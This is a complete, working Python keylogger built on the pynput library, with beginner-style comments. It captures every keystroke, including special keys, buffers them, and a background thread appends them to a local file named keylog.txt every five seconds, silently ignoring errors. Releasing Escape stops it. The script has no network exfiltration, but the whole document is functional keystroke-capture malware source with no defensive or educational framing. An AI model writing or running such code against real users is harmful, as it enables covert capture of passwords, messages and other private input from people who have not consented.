# import the needed libraries
from pynput import keyboard
import time
import threading

# this list will hold all the keys before we save them
keys_buffer = []

# this function will save the keys to a text file every few seconds
def save_keys():
    while True:
        time.sleep(5)
        if keys_buffer:
            try:
                with open("keylog.txt", "a") as file:
                    for k in keys_buffer:
                        file.write(str(k) + "\n")
                keys_buffer.clear()
            except:
                pass  # ignore errors silently

# when a key is pressed, we store it in the buffer
def on_press(key):
    try:
        keys_buffer.append(key.char)  # for normal keys
    except:
        keys_buffer.append(f"Special Key {key}")  # for special ones like shift, enter, etc

# stop the logger if escape is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # stop listener

# thread to keep saving the buffer in background
save_thread = threading.Thread(target=save_keys)
save_thread.daemon = True
save_thread.start()

# start listening for keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
